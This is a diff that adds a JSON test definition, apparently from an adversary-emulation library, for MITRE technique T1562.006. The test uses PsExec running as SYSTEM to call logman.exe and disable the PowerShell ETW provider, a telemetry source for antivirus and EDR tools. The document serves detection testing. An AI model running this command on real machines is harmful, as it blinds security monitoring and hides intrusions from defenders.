@@ -1,0 +1,48 @@
+{
+    "name": "Disable Powershell ETW Provider - Windows",
+    "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets",
+        "cleanup_command": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.006",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Indicator Blocking",
+    "source": "ART",
+    "uuid": "6f118276-121d-4c09-bb58-a8fb4a72ee84",
+    "arguments": {
+        "ps_exec_location": {
+            "description": "Location of PSExec.",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe"
+        },
+        "session": {
+            "description": "The session to disable.",
+            "type": "string",
+            "default": "EventLog-Application"
+        },
+        "provider": {
+            "description": "The provider to disable.",
+            "type": "string",
+            "default": "Microsoft-Windows-Powershell"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "PSExec must be installed on the machine.",
+            "prereq_command": "if (Test-Path \"#{ps_exec_location}\") {exit 0} else {exit 1}",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\" -force"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
